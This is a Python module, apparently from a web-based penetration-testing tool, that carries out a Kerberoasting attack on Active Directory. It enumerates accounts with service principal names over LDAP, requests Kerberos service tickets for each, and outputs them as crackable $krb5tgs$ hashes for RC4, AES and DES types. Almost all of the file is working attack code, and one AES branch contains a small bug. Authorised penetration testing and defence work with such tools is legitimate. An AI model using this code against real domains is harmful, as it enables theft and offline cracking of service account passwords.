"""
KERBEROASTING ATTACK

##
Inf: Host-based accounts are of no use in Kerberoasting Attacks, because a computer account in Active Directory has randomly generated 128-character long password
which is changed every 30 days.

"""

from __future__ import division
from __future__ import print_function
import datetime
import logging
import random
import sys
from binascii import hexlify

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from binascii import hexlify, unhexlify
from pentestui.pentest_api.attacks.kerberos.modules import version
from pentestui.pentest_api.attacks.kerberos.modules.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH
from pentestui.pentest_api.attacks.kerberos.modules.krb5 import constants
from pentestui.pentest_api.attacks.kerberos.modules.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter, TGS_REP
from pentestui.pentest_api.attacks.kerberos.modules.krb5.kerberosv5 import sendReceive, KerberosError, getKerberosTGT, getKerberosTGS
from pentestui.pentest_api.attacks.kerberos.modules.krb5.types import KerberosTime, Principal
from pentestui.pentest_api.attacks.kerberos.modules.smbconnection import SMBConnection
from pentestui.pentest_api.attacks.kerberos.modules.ntlm import compute_lmhash, compute_nthash
from ldap3 import Server, Connection, ALL, Tls, EXTERNAL, SASL, DIGEST_MD5
from pentestui.pentest_api.attacks.dns.resolution import DNSResolution
from pentestui.pentest_api.models import ProcessUI


class DomainPars:
    """ Detection To domain Name"""
    def DetectDomainLen2(self, DomainName):
        """Parent Domain Detection"""
        self.dc1 = DomainName.split('.')[0]
        self.dc2 = DomainName.split('.')[1]

    def DetectDomainLen3(self, DomainName):
        """Child Domain Detection"""
        self.dc1 = DomainName.split('.')[0]
        self.dc2 = DomainName.split('.')[1]
        self.dc3 = DomainName.split('.')[2]


class getKerberoastingEnum(DomainPars, DNSResolution):
    """ Kerberoasting Attack """
    def ReceivedArguments(self, ldapusername, ldapassword, serverIP, domainName, user):
        """ Connection To Server """
        self.ResolArguments(serverIP)
        if self.socketstatuts == 'Open':
            oName = 'Kerberoasting Attack'
            simpleServer = Server(serverIP, get_info='ALL')
            simpleConn = Connection(simpleServer, user=ldapusername, password=ldapassword)

            if not simpleConn.bind():
                self.ldapconnection = 'No Connection'

            self.spnUsers = []

            # Enumeration spn users to server
            if len(domainName.split('.')) == 2:
                self.DetectDomainLen2(domainName)

                # Ldap Spn Users
                searchFilter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"

                simpleConn.search('dc=%s,dc=%s'%(self.dc1, self.dc2), searchFilter, attributes=['SAMAccountName'])
                total = simpleConn.entries

                if len(total) == 0:
                    self.resultKerbAttack = []
                    self.resultKerbAttack.append('SpN Users Not Found')
                    RegisterToDb = ProcessUI(operationName=oName, result=self.resultKerbAttack, serverIP=serverIP, userinf=user)
                    RegisterToDb.save()

                else:
                    for entry in total:
                        splitedVar = str(entry['sAMAccountName'])
                        self.spnUsers.append(splitedVar)
                    self.spnUsers.remove('krbtgt')
                    # call the arguments function
                    self.KerberoastingArguments(ldapusername, ldapassword, domainName, serverIP, self.spnUsers, user)
            elif len(domainName.split('.')) == 3:
                self.DetectDomainLen3(domainName)

                # Ldap Spn Users Search On Child Domain
                simpleConn.search('dc=%s,dc=%s,dc=%s'%(self.dc1, self.dc2, self.dc3), '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))', attributes=['SAMAccountName'])
                total = simpleConn.entries

                if len(total) == 0:
                    self.resultKerbAttack = []
                    self.resultKerbAttack.append('SpN Users Not Found')
                    RegisterToDb = ProcessUI(operationName=oName, result=self.resultKerbAttack, serverIP=serverIP, userinf=user)
                    RegisterToDb.save()

                else:
                    for entry in total:
                        splitedVar = str(entry['sAMAccountName'])
                        self.spnUsers.append(splitedVar)
                    self.spnUsers.remove('krbtgt')
                    #call the arguments function
                    self.KerberoastingArguments(ldapusername, ldapassword, domainName, serverIP, self.spnUsers, user)
        elif self.socketstatuts == 'Close':
            self.resultKerbAttack = []
            self.resultKerbAttack.append('LDAP Connection Could Not Performed')




    def KerberoastingArguments(self, ldapusername, ldapassword, domainName, serverIP, spnUsers, user):
        """ Kerberoasting Attack Arguments """
        self.__username = ldapusername
        self.__password = ldapassword
        self.__domain = domainName
        self.__kdcHost = serverIP
        self.spnUsers = spnUsers
        self.resultKerbAttack = []
        TGT = self.getTGT()

        # Spn Users without Hos-Based
        for username in self.spnUsers:
            downLevelLogonName = self.__domain + "\\" + username
            principalName = Principal()
            principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
            principalName.components = [downLevelLogonName]

            # get TGS Ticket
            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                    self.__kdcHost,
                                                                    TGT['KDC_REP'], TGT['cipher'],
                                                                    TGT['sessionKey'])
            entry = self.outputTGS(tgs, oldSessionKey, sessionKey, username, self.__domain + "/" + username)
            self.resultKerbAttack.append(entry)

    def outputTGS(self, tgs, oldSessionKey, sessionKey, username, spn):
        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
        # RC4 Encryption TYPE
        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())

        # AES_128 Encryption TYPE
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode)

        # AES 256 Encryption TYPE
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())

        # MD5 ENCRYPTION TYPE
        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())

        return entry


    def getTGT(self):
        # Domain User for TGT Request
        userName = Principal(self.__username, type = constants.PrincipalNameType.NT_PRINCIPAL.value)
        try:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName,'', self.__domain,
                                                            compute_lmhash(self.__password),
                                                            compute_nthash(self.__password), None)
        except:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                unhexlify(''),
                                                                unhexlify(''), None,
                                                                kdcHost=self.__kdcHost)
        # TGT Response cipher, sessionKey, value
        TGT = {}
        TGT['KDC_REP'] = tgt
        TGT['cipher'] = cipher
        TGT['sessionKey'] = sessionKey

        return TGT
